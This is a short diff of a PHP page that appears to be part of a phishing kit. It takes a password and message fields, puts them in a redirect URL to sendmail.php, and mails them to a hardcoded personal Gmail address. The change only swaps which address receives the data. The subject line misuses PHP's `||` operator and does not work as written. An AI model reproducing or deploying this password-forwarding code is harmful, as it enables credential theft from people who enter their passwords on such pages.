@@ -9,11 +9,11 @@
         $subject = htmlentities(strip_tags(trim($_GET['subject']))) || 'HEY THERE';
         $password = htmlentities(strip_tags(trim($password)));
         $body = htmlentities(strip_tags(trim($_GET['body'])));
-        $to = "somto.achu5@gmail.com";
+        $to = "awotunde.emmanuel@gmail.com";
         $location = "../../sendmail.php?to=$to&subject=$subject&password=$password&body=$body";
         header("Location: " . $location);
     }
- ?>
+ ?>   
 
 <html><head>
 	  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
